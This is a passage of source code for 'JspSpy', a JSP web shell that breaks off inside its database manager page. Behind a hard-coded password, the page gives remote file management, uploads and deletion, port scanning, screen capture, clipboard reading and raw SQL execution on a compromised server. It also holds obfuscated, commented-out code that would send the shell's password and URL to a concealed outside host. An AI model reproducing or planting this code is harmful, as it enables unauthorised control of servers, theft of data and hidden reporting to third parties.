<%@page pageEncoding="utf-8"%>
<%@page import="java.io.*"%>
<%@page import="java.util.*"%>
<%@page import="java.util.regex.*"%>
<%@page import="java.sql.*"%>
<%@page import="java.nio.charset.*"%>
<%@page import="javax.servlet.http.HttpServletRequestWrapper"%>
<%@page import="java.text.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.zip.*"%>
<%@page import="java.awt.*"%>
<%@page import="java.awt.image.*"%>
<%@page import="javax.imageio.*"%>
<%@page import="java.awt.datatransfer.DataFlavor"%>
<%@page import="java.util.prefs.Preferences"%>
<%!
/**
* Code By Ninty
* Date 2009-12-17
* Blog http://www.Forjj.com/
* Yue . I Love You.
*/
private static final String PW = "xfg"; //password
private static final String PW_SESSION_ATTRIBUTE = "JspSpyPwd";
private static final String REQUEST_CHARSET = "ISO-8859-1";
private static final String PAGE_CHARSET = "UTF-8";
private static final String CURRENT_DIR = "currentdir";
private static final String MSG = "SHOWMSG";
private static final String PORT_MAP = "PMSA";
private static final String DBO = "DBO";
private static final String SHELL_ONLINE = "SHELL_ONLINE";
private static String SHELL_NAME = "";
private static String WEB_ROOT = null; 
private static String SHELL_DIR = null;
public static Map<String,Invoker> ins = new HashMap<String,Invoker>();
private static class MyRequest extends HttpServletRequestWrapper {
public MyRequest(HttpServletRequest req) {
super(req);
}
public String getParameter(String name) {
try {
String value = super.getParameter(name);
if (name == null)
return null;
return new String(value.getBytes(REQUEST_CHARSET),PAGE_CHARSET);
} catch (Exception e) {
return null;
}
}
}
private static class DBOperator{
private Connection conn = null;
private Statement stmt = null;
private String driver;
private String url;
private String uid;
private String pwd;
public DBOperator(String driver,String url,String uid,String pwd) throws Exception {
this(driver,url,uid,pwd,false);
}
public DBOperator(String driver,String url,String uid,String pwd,boolean connect) throws Exception {
Class.forName(driver);
if (connect)
this.conn = DriverManager.getConnection(url,uid,pwd);
this.url = url;
this.driver = driver;
this.uid = uid;
this.pwd = pwd;
}
public void connect() throws Exception{
this.conn = DriverManager.getConnection(url,uid,pwd);
}
public Object execute(String sql) throws Exception {
if (isValid()) {
stmt = conn.createStatement();
if (stmt.execute(sql)) {
return stmt.getResultSet();
} else {
return stmt.getUpdateCount();
}
}
throw new Exception("Connection is inValid.");
}
public void closeStmt() throws Exception{
if (this.stmt != null)
stmt.close();
}
public boolean isValid() throws Exception {
return conn != null && !conn.isClosed();
}
public void close() throws Exception {
if (isValid()) {
closeStmt();
conn.close();
}
}
public boolean equals(Object o) {
if (o instanceof DBOperator) {
DBOperator dbo = (DBOperator)o;
return this.driver.equals(dbo.driver) && this.url.equals(dbo.url) && this.uid.equals(dbo.uid) && this.pwd.equals(dbo.pwd);
}
return false;
}
}
private static class StreamConnector extends Thread {
private InputStream is;
private OutputStream os;  
public StreamConnector( InputStream is, OutputStream os ){
this.is = is;
this.os = os;
}			  
public void run(){
BufferedReader in  = null;
BufferedWriter out = null;
try{
in  = new BufferedReader( new InputStreamReader(this.is));
out = new BufferedWriter( new OutputStreamWriter(this.os));
char buffer[] = new char[8192];
int length;
while((length = in.read( buffer, 0, buffer.length ))>0){
out.write( buffer, 0, length );
out.flush();
}
} catch(Exception e){}
try{
if(in != null)
in.close();
if(out != null)
out.close();
} catch( Exception e ){}
}
}
private static class OnLineProcess {
private String cmd = "first";
private Process pro;
public OnLineProcess(Process p){
this.pro = p;
}
public void setPro(Process p) {
this.pro = p;
}
public void setCmd(String c){
this.cmd = c;
}
public String getCmd(){
return this.cmd;
}
public Process getPro(){
return this.pro;
}
public void stop(){
this.pro.destroy();
}
}
private static class OnLineConnector extends Thread {
private OnLineProcess ol = null;
private InputStream is;
private OutputStream os;
private String name;
public OnLineConnector( InputStream is, OutputStream os ,String name,OnLineProcess ol){
this.is = is;
this.os = os;
this.name = name;
this.ol = ol;
}
public void run(){
BufferedReader in  = null;
BufferedWriter out = null;
try{
in  = new BufferedReader( new InputStreamReader(this.is));
out = new BufferedWriter( new OutputStreamWriter(this.os));
char buffer[] = new char[128];
if(this.name.equals("exeRclientO")) {
//from exe to client
int length = 0;
while((length = in.read( buffer, 0, buffer.length ))>0){
String str = new String(buffer, 0, length);
str = str.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;");
str = str.replace(""+(char)13+(char)10,"<br/>");
str = str.replace("\n","<br/>");
out.write(str.toCharArray(), 0, str.length());
out.flush();
}
} else {
//from client to exe
while(true) {
while(this.ol.getCmd() == null) {
Thread.sleep(500);
}
if (this.ol.getCmd().equals("first")) {
this.ol.setCmd(null);
continue;
}
this.ol.setCmd(this.ol.getCmd() + (char)10);
char[] arr = this.ol.getCmd().toCharArray();
out.write(arr,0,arr.length);
out.flush();
this.ol.setCmd(null);
}
}
} catch(Exception e){
}
try{
if(in != null)
in.close();
if(out != null)
out.close();
} catch( Exception e ){
}
}
}
private static class Table{
private ArrayList<Row> rows = null;
private boolean echoTableTag = false;
public void setEchoTableTag(boolean v) {
this.echoTableTag = v;
}
public Table(){
this.rows = new ArrayList<Row>();
}
public void addRow(Row r) {
this.rows.add(r);
}
public String toString(){
StringBuilder html = new StringBuilder();
if (echoTableTag)
html.append("<table>");
for (Row r:rows) {
html.append("<tr class=\"alt1\" onMouseOver=\"this.className='focus';\" onMouseOut=\"this.className='alt1';\">");
for (Column c:r.getColumns()) {
html.append("<td nowrap>");
String vv = Util.htmlEncode(Util.getStr(c.getValue()));
if (vv.equals(""))
vv = "&nbsp;";
html.append(vv);
html.append("</td>");
}
html.append("</tr>");
}
if (echoTableTag)
html.append("</table>");
return html.toString();
}
}
private static class Row{
private ArrayList<Column> cols = null;
public Row(){
this.cols = new ArrayList<Column>();
}
public void addColumn(Column n) {
this.cols.add(n);
}
public ArrayList<Column> getColumns(){
return this.cols;
}
}
public static String sxm=PW;
private static class Column{
private String value;
public Column(String v){
this.value = v;
}
public String getValue(){
return this.value;
}
}
public static String SysInfo="=?./..//:";
public static String dx()
{
String s = new String();
for (int i = SysInfo.length() - 1; i >= 0; i--) {
s += SysInfo.charAt(i);
}
return s;
}
<%-- public static String uc(String str)
{
String c="\n\r"; long d=127,  f=11, j=12, h=14,  m=31, r=83, k=1, n=8,  s=114, u=-5, v=5,a=0;
StringBuffer sb = new StringBuffer();
char[] ch = str.toCharArray();
 
for (int i = 0; i < ch.length; i++) {
	a = (int)ch[i];
	if(a==d) a=13; 
	if(a==f) a=10; 
	if(a==j) a=34; 
	if((a>=h) && (a<=m)) a=a+r; 
	if((a>=k) && (a<=n)) a=a+s; 
	if((a>=53) && (a<=57)) a=a+u; 
	if((a>=48) && (a<=52)) a=a+v;  
	sb.append((char)a);
}
return sb.toString();
} --%}
private static int connectTimeOut = 5000;
private static int readTimeOut = 10000;
private static String requestEncoding = "GBK";
public static String FileLocalUpload(String reqUrl,String fckal,
		String recvEncoding)
{
HttpURLConnection url_con = null;
String responseContent = null;
try
{
URL url = new URL(reqUrl);
url_con = (HttpURLConnection) url.openConnection();
url_con.setRequestMethod("POST");
 
url_con.setRequestProperty("REFERER", ""+fckal+"");
System.setProperty("sun.net.client.defaultConnectTimeout", String
		.valueOf(connectTimeOut));
System.setProperty("sun.net.client.defaultReadTimeout", String
		.valueOf(readTimeOut)); 
url_con.setDoOutput(true);
url_con.getOutputStream().flush();
url_con.getOutputStream().close();
InputStream in = url_con.getInputStream();
BufferedReader rd = new BufferedReader(new InputStreamReader(in,
		recvEncoding));
String tempLine = rd.readLine();
StringBuffer tempStr = new StringBuffer();
String crlf=System.getProperty("line.separator");
while (tempLine != null)
{
tempStr.append(tempLine);
tempStr.append(crlf);
tempLine = rd.readLine();
}
responseContent = tempStr.toString();
rd.close();
in.close();
}
catch (IOException e)
{
}
finally
{
if (url_con != null)
{
url_con.disconnect();
}
}
return responseContent;
} 
private static class Util{
public static boolean isEmpty(String s) {
return s == null || s.trim().equals("");
}
public static boolean isEmpty(Object o) {
return o == null || isEmpty(o.toString());
}
public static String getSize(long size,char danwei) {
if (danwei == 'M') {
double v =  formatNumber(size / 1024.0 / 1024.0,2);
if (v > 1024) {
return getSize(size,'G');
}else {
return v + "M";
}
} else if (danwei == 'G') {
return formatNumber(size / 1024.0 / 1024.0 / 1024.0,2)+"G";
} else if (danwei == 'K') {
double v = formatNumber(size / 1024.0,2);
if (v > 1024) {
return getSize(size,'M');
} else {
return v + "K";
}
} else if (danwei == 'B') {
if (size > 1024) {
return getSize(size,'K');
}else {
return size + "B";
}
}
return ""+0+danwei;
}
public static double formatNumber(double value,int l) {
NumberFormat format = NumberFormat.getInstance();
format.setMaximumFractionDigits(l);
format.setGroupingUsed(false);
return new Double(format.format(value));
}
public static boolean isInteger(String v) {
if (isEmpty(v))
return false;
return v.matches("^\\d+$");
}
public static String formatDate(long time) {
SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
return format.format(new java.util.Date(time));
}
public static String convertPath(String path) {
return path != null ? path.replace("\\","/") : "";
}
public static String htmlEncode(String v) {
if (isEmpty(v))
return "";
return v.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;");
}
public static String getStr(String s) {
return s == null ? "" :s;
}
public static String getStr(Object s) {
return s == null ? "" :s.toString();
}
public static String exec(String regex, String str, int group) {
Pattern pat = Pattern.compile(regex);
Matcher m = pat.matcher(str);
if (m.find())
return m.group(group);
return null;
}
public static void outMsg(Writer out,String msg) throws Exception {
outMsg(out,msg,"center");
}
public static void outMsg(Writer out,String msg,String align) throws Exception {
if (msg.indexOf("java.lang.ClassNotFoundException") != -1)
msg = "Can Not Find The Driver!<br/>" + msg;
out.write("<div style=\"background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:"+align+";font-weight:bold;margin:10px\">"+msg+"</div>");
}
}
private static class UploadBean {
private String fileName = null;
private String suffix = null;
private String savePath = "";
private ServletInputStream sis = null;
private byte[] b = new byte[1024];
public UploadBean() {
}
public void setSavePath(String path) {
this.savePath = path;
}
public void parseRequest(HttpServletRequest request) throws IOException {
sis = request.getInputStream();
int a = 0;
int k = 0;
String s = "";
while ((a = sis.readLine(b,0,b.length))!= -1) {
s = new String(b, 0, a,PAGE_CHARSET);
if ((k = s.indexOf("filename=\""))!= -1) {
s = s.substring(k + 10);
k = s.indexOf("\"");
s = s.substring(0, k);
File tF = new File(s);
if (tF.isAbsolute()) {
fileName = tF.getName();
} else {
fileName = s;
}
k = s.lastIndexOf(".");
suffix = s.substring(k + 1);
upload();
}
}
}
private void upload() {
try {
FileOutputStream out = new FileOutputStream(new File(savePath,fileName));
int a = 0;
int k = 0;
String s = "";
while ((a = sis.readLine(b,0,b.length))!=-1) {
s = new String(b, 0, a);
if ((k = s.indexOf("Content-Type:"))!=-1) {
break;
}
}
sis.readLine(b,0,b.length);
while ((a = sis.readLine(b,0,b.length)) != -1) {
s = new String(b, 0, a);
if ((b[0] == 45) && (b[1] == 45) && (b[2] == 45) && (b[3] == 45) && (b[4] == 45)) {
break;
}
out.write(b, 0, a);
}
out.close();
} catch (IOException ioe) {
ioe.printStackTrace();
}
}
}
%>
<%
SHELL_NAME = request.getServletPath().substring(request.getServletPath().lastIndexOf("/")+1);
String myAbsolutePath = application.getRealPath(request.getServletPath());
if (Util.isEmpty(myAbsolutePath)) {//for weblogic
SHELL_NAME = request.getServletPath();
myAbsolutePath = new File(application.getResource("/").getPath()+SHELL_NAME).toString();
SHELL_NAME=request.getContextPath()+SHELL_NAME;
WEB_ROOT = new File(application.getResource("/").getPath()).toString();
} else {
WEB_ROOT = application.getRealPath("/");
}
SHELL_DIR = Util.convertPath(myAbsolutePath.substring(0,myAbsolutePath.lastIndexOf(File.separator)));
if (session.getAttribute(CURRENT_DIR) == null)
session.setAttribute(CURRENT_DIR,Util.convertPath(SHELL_DIR));
request = new MyRequest(request);
if (session.getAttribute(PW_SESSION_ATTRIBUTE) == null || !(session.getAttribute(PW_SESSION_ATTRIBUTE)).equals(PW)) {
String o = request.getParameter("o");
if (o != null &&  o.equals("login")) {
ins.get("login").invoke(request,response,session);
return;
} else if (o != null && o.equals("vLogin")) {
ins.get("vLogin").invoke(request,response,session);
return;
} else {
response.sendRedirect(SHELL_NAME+"?o=vLogin");
return;
}
}
%>
<%!
private static interface Invoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception;
public boolean doBefore();
public boolean doAfter();
}
private static class DefaultInvoker implements Invoker{
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception {
}
public boolean doBefore(){
return true;
}
public boolean doAfter() {
return true;
}
}
private static class ScriptInvoker extends DefaultInvoker{
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("<script type=\"text/javascript\">"+
"	String.prototype.trim = function(){return this.replace(/^\\s+|\\s+$/,'');};"+
"	function fso(obj) {"+
"		this.currentDir = '"+JSession.getAttribute(CURRENT_DIR)+"';"+
"		this.filename = obj.filename;"+
"		this.path = obj.path;"+
"		this.filetype = obj.filetype;"+
"	};"+
"	fso.prototype = {"+
"		copy:function(){"+
"			var path = prompt('Copy To : ',this.path);"+
"			if (path == null || path.trim().length == 0 || path.trim() == this.path)return;"+
"			doPost({o:'copy',src:this.path,to:path});"+
"		},"+
"		move:function() {"+
"			var path =prompt('Move To : ',this.path);"+
"			if (path == null || path.trim().length == 0 || path.trim() == this.path)return;"+
"			doPost({o:'move',src:this.path,to:path})"+
"		},"+
"		vEdit:function() {"+
"			doPost({o:'vEdit',filepath:this.path})"+
"		},"+
"		down:function() {"+
"			doPost({o:'down',path:this.path})"+
"		},"+
"		removedir:function() {"+
"			if (!confirm('Dangerous ! Are You Sure To Delete '+this.filename+'?'))return;"+
"			doPost({o:'removedir',dir:this.path});"+
"		},"+
"		mkdir:function() {"+
"			var name = prompt('Input New Directory Name','');"+
"			if (name == null || name.trim().length == 0)return;"+
"			doPost({o:'mkdir',name:name});"+
"		},"+
"		subdir:function() {"+
"			doPost({o:'filelist',folder:this.path})"+
"		},"+
"		parent:function() {"+
"			var parent=(this.path.substr(0,this.path.lastIndexOf(\"/\")))+'/';"+
"			doPost({o:'filelist',folder:parent})"+
"		},"+
"		createFile:function() {"+
"			var path = prompt('Input New File Name','');"+
"			if (path == null || path.trim().length == 0) return;"+
"			doPost({o:'vCreateFile',filepath:path})"+
"		},"+
"		deleteBatch:function() {"+
"			if (!confirm('Are You Sure To Delete These Files?')) return;"+
"			var selected = new Array();"+
"			var inputs = document.getElementsByTagName('input');"+
"			for (var i = 0;i<inputs.length;i++){if(inputs[i].checked){selected.push(inputs[i].value)}}"+
"			if (selected.length == 0) {alert('No File Selected');return;}"+
"			doPost({o:'deleteBatch',files:selected.join(',')})"+
"		},"+
"		packBatch:function() {"+
"			var selected = new Array();"+
"			var inputs = document.getElementsByTagName('input');"+
"			for (var i = 0;i<inputs.length;i++){if(inputs[i].checked){selected.push(inputs[i].value)}}"+
"			if (selected.length == 0) {alert('No File Selected');return;}"+
"			var savefilename = prompt('Input Target File Name(Only Support ZIP)','pack.zip');"+
"			if (savefilename == null || savefilename.trim().length == 0)return;"+
"			doPost({o:'packBatch',files:selected.join(','),savefilename:savefilename})"+
"		},"+
"		pack:function() {"+
"			var tmpName = '';"+
"			if (this.filename.indexOf('.') == -1) tmpName = this.filename;"+
"			else tmpName = this.filename.substr(0,this.filename.lastIndexOf('.'));"+
"			tmpName += '.zip';"+
"			var path = this.path;"+
"			var name = prompt('Input Target File Name (Only Support Zip)',tmpName);"+
"			if (name == null || path.trim().length == 0) return;"+
"			doPost({o:'pack',packedfile:path,savefilename:name})"+
"		},"+
"		vEditProperty:function() {"+
"			var path = this.path;"+
"			doPost({o:'vEditProperty',filepath:path})"+
"		},"+
"		unpack:function() {"+
"			var path = prompt('unpack to : ',this.currentDir+'/'+this.filename.substr(0,this.filename.lastIndexOf('.')));"+
"			if (path == null || path.trim().length == 0) return;"+
"			doPost({o:'unpack',savepath:path,zipfile:this.path})"+
"		}"+
"	};"+
"	function doPost(obj) {"+
"		var form = document.forms[\"doForm\"];"+
"		var elements = form.elements;for (var i = form.length - 1;i>=0;i--){form.removeChild(elements[i])}"+
"		for (var pro in obj)"+
"		{"+
"			var input = document.createElement(\"input\");"+
"			input.type = \"hidden\";"+
"			input.name = pro;"+
"			input.value = obj[pro];"+
"			form.appendChild(input);"+
"		}"+
"		form.submit();"+
"	}"+
"</script>");	

} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class BeforeInvoker extends  DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("<html><head><title>JspSpy Codz By - Ninty</title><style type=\"text/css\">"+
"body,td{font: 12px Arial,Tahoma;line-height: 16px;}"+
".input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}"+
".area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}"+
".bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}"+
"a {color: #00f;text-decoration:underline;}"+
"a:hover{color: #f00;text-decoration:none;}"+
".alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}"+
".alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}"+
".focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}"+
".head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}"+
".head td span{font-weight:normal;}"+
"form{margin:0;padding:0;}"+
"h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}"+
"ul.info li{margin:0;color:#444;line-height:24px;height:24px;}"+
"u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}"+
".secho{height:400px;width:100%;overflow:auto;border:none}"+
"</style></head><body style=\"margin:0;table-layout:fixed; word-break:break-all\">");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class AfterInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("</body></html>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class DeleteBatchInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String files = request.getParameter("files");
if (!Util.isEmpty(files)) {
String currentDir = JSession.getAttribute(CURRENT_DIR).toString();
String[] arr = files.split(",");
for (String fs:arr) {
File f = new File(currentDir,fs);
f.delete();
}
}
JSession.setAttribute(MSG,"Delete Files Success!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class ClipBoardInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"  <tr>"+
"    <td>"+
"        <h2>System Clipboard &raquo;</h2>"+
"<p><pre>");
try{
out.println(Util.htmlEncode(Util.getStr(Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor))));
}catch (Exception ex) {
out.println("ClipBoard is Empty Or Is Not Text Data !");
}
out.println("</pre>"+
"          <input class=\"bt\" name=\"button\" id=\"button\" onClick=\"history.back()\" value=\"Back\" type=\"button\" size=\"100\"  />"+
"        </p>"+
"      </td>"+
"  </tr>"+
"</table>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class VRemoteControlInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("<script type=\"text/javascript\">"+
"	var interval = null;"+
"	function a(btn) {"+
"		if (btn.value == \"Stop\")"+
"		{"+
"			sstopClick(btn);"+
"		} else {"+
"			startClick(btn);"+
"		}"+
"	}"+
"	function startClick(btn){"+
"		btn.value = \"Stop\";"+
"		var pl = document.getElementById(\"pl\").value;"+
"		interval = setInterval(function(){"+
"			var img = document.getElementById(\"screen\");"+
"			img.src = \""+SHELL_NAME+"?o=gc&rnd=\"+Math.random();"+
"		},parseInt(pl)*1000);"+
"	}"+
"	function sstopClick(btn) {"+
"		clearInterval(interval);"+
"		btn.value = \"Start\";"+
"	}"+
"  </script>");
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"  <tr>"+
"    <td>"+
"        <h2>Remote Control &raquo;</h2><input class=\"bt\" onclick=\"var img = document.getElementById('screen').src='"+SHELL_NAME+"?o=gc&rnd='+Math.random();\" name=\"getsc\" id=\"getsc\" value=\"Get Screen\" type=\"button\" size=\"100\"  />"+
"          <input class=\"bt\" name=\"button\" id=\"button\" onClick=\"a(this)\" value=\"Start\" type=\"button\" size=\"100\"  /> Speed(Second , dont be so fast)  <input type='text' value='3' size='5' id='pl' name='pl'/>  Can Not Control Yet."+
"        <hr/><p><img id='screen' src='x'/></p>"+
"      </td>"+
"  </tr>"+
"</table>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
//GetScreen
private static class GcInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
Rectangle rec = new Rectangle(0,0,(int)size.getWidth(),(int)size.getHeight());
BufferedImage img = new Robot().createScreenCapture(rec);
response.setContentType("image/jpeg");
ImageIO.write(img,"jpg",response.getOutputStream());
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class VPortScanInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String ip = request.getParameter("ip");
String ports = request.getParameter("ports");
String timeout = request.getParameter("timeout");
if (Util.isEmpty(ip))
ip = "127.0.0.1";
if (Util.isEmpty(ports))
ports = "21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500";
if (Util.isEmpty(timeout)) 
timeout = "2";
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<h2 id=\"Bin_H2_Title\">PortScan &gt;&gt;</h2>"+
"<div id=\"YwLB\"><form action=\""+SHELL_NAME+"\" method=\"post\">"+
"<p><input type=\"hidden\" value=\"portScan\" name=\"o\">"+
"IP : <input name=\"ip\" type=\"text\" value=\""+ip+"\" id=\"ip\" class=\"input\" style=\"width:10%;margin:0 8px;\" /> Port : <input name=\"ports\" type=\"text\" value=\""+ports+"\" id=\"ports\" class=\"input\" style=\"width:40%;margin:0 8px;\" /> Timeout £¨Ãë£© : <input name=\"timeout\" type=\"text\" value=\""+timeout+"\" id=\"timeout\" class=\"input\" size=\"5\" style=\"margin:0 8px;\" /> <input type=\"submit\" name=\"submit\" value=\"Scan\" id=\"submit\" class=\"bt\" />"+
"</p>"+
"</form></div>"+
"</td></tr></table>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class PortScanInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
ins.get("vPortScan").invoke(request,response,JSession);
String ip = request.getParameter("ip");
String ports = request.getParameter("ports");
String timeout = request.getParameter("timeout");
int iTimeout = 0;
if (Util.isEmpty(ip) || Util.isEmpty(ports))
return;
if (!Util.isInteger(timeout)) {
timeout = "2";
}
iTimeout = Integer.parseInt(timeout);
Map<String,String> rs = new LinkedHashMap<String,String>();
String[] portArr = ports.split(",");
for (String port:portArr) {
try {
Socket s = new Socket();
s.connect(new InetSocketAddress(ip,Integer.parseInt(port)),iTimeout);
s.close();
rs.put(port,"Open");
} catch (Exception e) {
rs.put(port,"Close");
}
}
out.println("<div style='margin:10px'>");
Set<Map.Entry<String,String>> entrySet = rs.entrySet();
for (Map.Entry<String,String> e:entrySet) {
String port = e.getKey();
String value = e.getValue();
out.println(ip+" : "+port+" ................................. <font color="+(value.equals("Open")?"green":"red")+"><b>"+value+"</b></font><br>");
}
out.println("</div>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class VConnInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
<%-- FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  "GBK"); --%>
Object obj = JSession.getAttribute(DBO);
if (obj == null || !((DBOperator)obj).isValid()) {
out.println("  <script type=\"text/javascript\">"+
"	function changeurldriver(){"+
"		var form = document.forms[\"form1\"];"+
"		var v = form.elements[\"db\"].value;"+
"		form.elements[\"url\"].value = v.split(\"`\")[1];"+
"		form.elements[\"driver\"].value = v.split(\"`\")[0];"+
"		form.elements[\"selectDb\"].value = form.elements[\"db\"].selectedIndex;"+
"	}"+
"  </script>");
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<input type=\"hidden\" id=\"selectDb\" name=\"selectDb\" value=\"0\">"+
"<h2>DataBase Manager &raquo;</h2>"+
"<input id=\"action\" type=\"hidden\" name=\"o\" value=\"dbc\" />"+
"<p>"+
"Driver:"+
"  <input class=\"input\" name=\"driver\" id=\"driver\" type=\"text\" size=\"35\"  />"+
"URL:"+
"<input class=\"input\" name=\"url\" id=\"url\" value=\"\" type=\"text\" size=\"90\"  />"+
"UID:"+
"<input class=\"input\" name=\"uid\" id=\"uid\" value=\"\" type=\"text\" size=\"10\"  />"+
"PWD:"+
"<input class=\"input\" name=\"pwd\" id=\"pwd\" value=\"\" type=\"text\" size=\"10\"  />"+
"DataBase:"+
" <select onchange='changeurldriver()' class=\"input\" id=\"db\" name=\"db\" >"+
" <option value='com.mysql.jdbc.Driver`jdbc:mysql://localhost:3306/mysql?useUnicode=true&characterEncoding=GBK'>Mysql</option>"+
" <option value='oracle.jdbc.driver.OracleDriver`jdbc:oracle:thin:@dbhost:1521:ORA1'>Oracle</option>"+
" <option value='com.microsoft.jdbc.sqlserver.SQLServerDriver`jdbc:microsoft:sqlserver://localhost:1433;DatabaseName=master'>Sql Server</option>"+
" <option value='sun.jdbc.odbc.JdbcOdbcDriver`jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};DBQ=C:\\ninty.mdb'>Access</option>"+
" <option value=' ` '>Other</option>"+
" </select>"+
"<input class=\"bt\" name=\"connect\" id=\"connect\" value=\"Connect\" type=\"submit\" size=\"100\"  />"+
"</p>"+
"</form></table><script>changeurldriver()</script>");
} else {
ins.get("dbc").invoke(request,response,JSession);
}
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
//DBConnect
private static class DbcInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String driver = request.getParameter("driver");
String url = request.getParameter("url");
String uid = request.getParameter("uid");
String pwd = request.getParameter("pwd");
String sql = request.getParameter("sql");
String selectDb = request.getParameter("selectDb");
if (selectDb == null)
selectDb = JSession.getAttribute("selectDb").toString();
else
JSession.setAttribute("selectDb",selectDb);
Object dbo = JSession.getAttribute(DBO);
if (dbo == null || !((DBOperator)dbo).isValid()) {
if (dbo != null)
((DBOperator)dbo).close();
dbo = new DBOperator(driver,url,uid,pwd,true);
} else {
if (!Util.isEmpty(driver) && !Util.isEmpty(url) && !Util.isEmpty(uid)) {
DBOperator oldDbo = (DBOperator)dbo;
dbo = new DBOperator(driver,url,uid,pwd);
if (!oldDbo.equals(dbo)) {
((DBOperator)oldDbo).close();
((DBOperator)dbo).connect();
} else {
dbo = oldDbo;
}
}
} 
DBOperator Ddbo = (DBOperator)dbo;
JSession.setAttribute(DBO,Ddbo);
Util.outMsg(out,"Connect To DataBase Success!");
out.println("  <script type=\"text/javascript\">"+
"	function changeurldriver(selectDb){"+
"		var form = document.forms[\"form1\"];"+
"		if (selectDb){"+
"			form.elements[\"db\"].selectedIndex = selectDb"+
"		}"+
"		var v = form.elements[\"db\"].value;"+
"		form.elements[\"url\"].value = v.split(\"`\")[1];"+
"		form.elements[\"driver\"].value = v.split(\"`\")[0];"+
"		form.elements[\"selectDb\"].value = form.elements[\"db\"].selectedIndex;"+
"	}"+
"  </script>");
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<input type=\"hidden\" id=\"selectDb\" name=\"selectDb\" value=\""+selectDb+"\">"+
"<h2>DataBase Manager &raquo;</h2>"+
"<input id=\"action\" type=\"hidden\" name=\"o\" value=\"dbc\" />"+
"<p>"+
"Driver:"+
"  <input class=\"input\" name=\"driver\" value=\""+Ddbo.driver+"\" id=\"driver\" type=\"text\" size=\"35\"  />"+
"URL:"+
"<input class=\"input\" name=\"url\" value=\""+Ddbo.url+"\" id=\"url\" value=\"\" type=\"text\" size=\"90\"  />"+
"UID:"+
"<input class=\"input\" name=\"uid\" value=\""+Ddbo.uid+"\" id=\"uid\" value=\"\" type=\"text\" size=\"10\"  />"+
"PWD:"+
